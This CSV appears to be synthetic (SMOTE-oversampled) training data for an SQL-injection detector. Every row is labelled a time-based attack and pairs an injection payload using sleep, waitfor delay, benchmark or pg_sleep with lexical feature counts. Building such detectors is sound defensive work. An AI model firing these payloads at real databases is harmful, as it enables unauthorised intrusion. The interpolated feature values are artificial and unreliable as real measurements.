id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000064,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000296,0.025124433491951568,75.98020450560138,19.950511264003456,2.6801297717630654,12.980204505601382,10.0,44.0,9.0,0.17083088261964566,0.13161414561592927,0.5791022407100888,0.11845273105433633,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0098977471993085,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0098977471993087
SMOTE_000065,attack,time,"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000196,0.5567834371324318,76.16115865497741,24.735536538009036,3.444908430578961,16.0,18.0,32.52892692398193,9.632231730995482,0.21029530409560263,0.23658221710755298,0.4267258352303053,0.12639664356653907,0.0,1.0,0.0,0.0,0.0,2.0,0.0,4.632231730995482,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000066,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000173,0.20007877646691025,83.61922625361093,19.095193436597267,2.9061128672344845,27.0,2.0,42.61922625361093,12.0,0.32295846594531324,0.023922849329282472,0.5095815887497095,0.14353709597569475,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.904806563402733,0.09519343659726776,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000067,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000202,1.150886187790632,66.27628933372664,17.674815809467624,2.5809001246393053,12.024447428402869,2.0,38.60147352425901,13.650368381064753,0.18287255151393866,0.030248112089028778,0.58110648977518,0.20577284662185252,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,6.650368381064753,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.3251841905323768,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3251841905323767
SMOTE_000068,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",nearest_attack_euclidean,R000215,0.642949403080479,82.24509737022726,23.26470788931824,3.3089652944303367,21.245097370227253,10.0,38.0,13.0,0.2582942902709172,0.12159109995558734,0.4620461798312319,0.15806842994226356,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.2450973702272523,0.7549026297727476,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000069,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000183,0.8009937102126853,82.70791265832581,21.876262025022566,3.2734259272921467,21.70791265832581,10.0,38.0,13.0,0.26244235559181234,0.12091108924724389,0.45946213913952677,0.15718441602141706,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.707912658325811,0.29208734167418887,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000070,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000262,1.3155539501434819,76.21107466397635,22.447231334005913,3.3162240280119284,15.447231334005913,18.0,32.21107466397634,10.552768665994085,0.20300033334941375,0.2363480000083898,0.4222604444239361,0.1383912222182604,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.552768665994086,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4472313340059143,0.5527686659940858,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000071,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000079,1.465738710625932,79.71992266409043,21.019970999033912,3.0890478246938637,29.359961332045216,2.0,38.67998066602261,9.679980666022608,0.3679998759316959,0.02514288077491507,0.4857145072648288,0.12114273602856027,0.0,0.0,0.679980666022609,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.679980666022609,0.0,0.0,0.3399903330113045,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000072,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000172,0.7594672218383222,76.5033076050986,18.0,2.8312128738668325,22.641439597814884,2.0,40.28949440582697,11.572373601456743,0.2970313328489331,0.026181542937848107,0.5257207736078661,0.15106635060535262,0.0,3.999999999999999,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,7.572373601456744,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.7861868007283719,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.786186800728372
SMOTE_000073,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000181,2.0506977318854482,66.0,26.90760123513414,4.091794811163946,24.210134980178857,12.0,18.882263784687,10.907601235134143,0.3668202269724069,0.18181818181818182,0.28609490582859093,0.16526668538082034,3.6050674900894277,0.0,2.0,0.0,0.0,1.0,0.0,1.6974662549552861,0.0,0.0,0.0,3.6050674900894286,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3025337450447142,0.30253374504471414,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3025337450447143
SMOTE_000074,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000026,0.7356972648681293,77.16469134431142,19.0,2.759398968757745,21.0,2.0,41.73175307544914,12.432938268862285,0.27313240745883216,0.02601261023417449,0.5398738976582551,0.16098108464873828,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,7.4329382688622845,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000075,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000063,0.7608045675824368,69.74556027551671,17.372780137758355,2.95794731620443,23.745560275516706,2.0,34.0,10.0,0.3403338993006263,0.02868113481301625,0.4875792918212762,0.14340567406508123,4.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.627219862241647,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.627219862241647
SMOTE_000076,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000048,3.077496922342035,66.13188215988632,27.552588262873382,4.294912723129519,31.474117371266175,8.420706102987062,14.894823474253236,11.342235211379853,0.47331260228409033,0.1308212921926415,0.22506293166429597,0.1708031738589722,3.4474117371266173,0.0,2.0,0.0,0.0,0.5525882628733825,0.0,1.4474117371266169,0.0,0.4474117371266174,0.44741173712661747,3.5525882628733827,1.0,0.0,1.0,0.0,0.0,0.5525882628733825,1.0,0.0,0.0,0.0,0.0,0.5525882628733826,0.0,0.5525882628733826,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1051765257467654
SMOTE_000077,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.7518489039848721,75.42204480729445,25.052936863782907,3.537947242478555,16.579405295674363,18.0,31.579405295674363,9.263234215945726,0.21852720738221199,0.2399351623314869,0.4184731759917844,0.1230644542945167,0.0,1.0,0.0,0.0,0.0,2.0,0.0,4.263234215945728,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000078,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000071,0.17730704233314326,82.83091382126254,24.83091382126254,3.2284702432965497,29.83091382126254,2.0,39.0,12.0,0.3601128116208411,0.024146686353930524,0.47086038390164525,0.14488011812358315,0.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0845430893687299,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.084543089368729
SMOTE_000079,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000167,0.530433908503158,70.95497032623685,25.0,3.6712613952536852,17.0,19.0,25.563976260989474,9.39099406524737,0.2398679013815068,0.26808765448521343,0.3597718515821758,0.13227259255110396,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.390994065247369,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000080,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000223,0.8251872103889454,83.3731754793651,18.3731754793651,2.855551674671662,27.0,2.0,43.0,11.373175479365097,0.32385603299729526,0.02398933577757742,0.5157707192179146,0.1363839120072127,0.3731754793650972,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,0.3731754793650973,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000081,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000231,0.3384435840271375,64.79035440530842,28.89517720265421,4.114167549286016,23.41929118938316,12.0,20.266240418579468,9.10482279734579,0.36167906617528983,0.1852297306804149,0.3125050512078605,0.14058615193643484,2.1048227973457903,0.0,2.0,0.0,0.0,1.0,0.0,1.8951772026542097,0.0,0.0,0.0,3.1048227973457903,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.1048227973457902,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1048227973457903
SMOTE_000082,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000026,0.07824465982257849,79.69845237728778,19.0,2.705063691560826,21.0,2.0,43.758761901830226,12.939690475457557,0.2636308035851708,0.025107695579540068,0.5489230442045993,0.16233845663068988,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,7.939690475457556,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000083,attack,time,"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000196,0.5606437674689294,76.14840947000748,24.74063621199701,3.445458303044681,16.0,18.0,32.51872757600598,9.629681894001495,0.21033112899190032,0.23662252011588786,0.4266622460393769,0.12638410485283488,0.0,1.0,0.0,0.0,0.0,2.0,0.0,4.629681894001495,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000084,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,nearest_attack_euclidean,R000247,0.5163739797867196,70.97107376789718,24.0,3.4188913195252204,23.0,4.0,30.576859014317748,13.394214753579437,0.3250165663801806,0.05652462024003142,0.4297637374277942,0.18869507595199372,6.0,0.0,0.0,0.0,0.0,1.0,0.0,4.394214753579437,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000085,attack,time,1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000127,1.0436664118994083,84.42388187884113,25.84776375768225,3.6391678508197263,24.0,18.0,33.0,9.423881878841126,0.2842894726761643,0.21321710450712322,0.3908980249297259,0.11159539788698661,0.0,0.4238818788411253,2.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,4.0,0.0,0.4238818788411254,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000086,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.9217978275813579,66.0,23.0,3.369255173852069,19.730708510639577,10.0,29.0,7.269291489360425,0.29895012894908446,0.15151515151515152,0.4393939393939394,0.11014078014182462,0.2692914893604247,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,0.0,1.0,0.2692914893604246,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.7307085106395753,0.2692914893604248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000087,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,nearest_attack_euclidean,R000312,1.2168493208718507,75.43171078790141,18.6487798567452,2.898244956232232,22.6756100716274,2.0,39.404880573019206,11.351220143254801,0.30164628584081016,0.02664493269251622,0.5213800655578291,0.15032871590884447,4.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,7.351220143254801,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.6756100716274012,0.3243899283725991,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000088,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,1.4927505686054583,76.63508387415297,22.807796416478435,3.4205294693859907,21.59610179176078,10.0,33.23118566591374,11.807796416478435,0.2830844613376498,0.13091365874682098,0.43214567948331345,0.1538562004322157,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,4.8077964164784355,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.5961017917607823,0.40389820823921796,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000289,0.5474997209545813,65.79635784205264,28.18543136821056,4.061724928627062,23.0,12.0,21.0,9.79635784205264,0.3495766362780395,0.1823878102320206,0.319178667906036,0.14885688558390392,2.0,0.7963578420526393,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.7963578420526394,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000259,0.49550569797790356,74.83575006127049,27.0,3.800962041853636,23.0,15.0,26.468600049016384,10.367150012254097,0.30765327513009816,0.20064344030223794,0.35323393959368354,0.13846934497398036,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.367150012254096,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000091,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000048,1.2698718648746152,64.2007111347366,27.199525910175602,4.194105879648783,25.399051820351204,12.0,16.801659314385397,10.0,0.39651781242045153,0.18701093467608484,0.26062880734005955,0.15584244556340404,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.400237044912199,0.0,0.0,0.0,3.5997629550878,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5997629550878004,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5997629550878005
SMOTE_000092,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000253,1.0228642170386053,84.18309659381825,23.549289781454753,3.4688815300279856,26.915482969091254,10.0,35.45071021854525,11.81690340618175,0.3196274590986542,0.1187911812411509,0.42118601974514613,0.1403953399150487,0.0,3.999999999999999,0.0,0.0,0.0,1.183096593818251,0.0,5.633806812363498,0.0,0.18309659381825114,0.816903406181749,1.183096593818251,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.18309659381825089,0.0,-2.7755575615628914e-17,0.183096593818251,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.816903406181749,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.183096593818251
SMOTE_000093,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000139,1.190201814107648,64.42137283364201,21.526209055452664,3.3114612817780875,19.421372833642007,10.0,28.0,7.0,0.3010971085891992,0.15531175364684463,0.4348729102111649,0.10871822755279123,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,0.5262090554526643,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5262090554526644
SMOTE_000094,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,nearest_attack_euclidean,R000238,0.6071628829733188,70.49255360432173,16.738830406482585,2.8434746937167934,25.0,1.0,35.246276802160864,9.246276802160862,0.3546996348991978,0.014187985395967911,0.5,0.13111237970483428,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2462768021608616,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
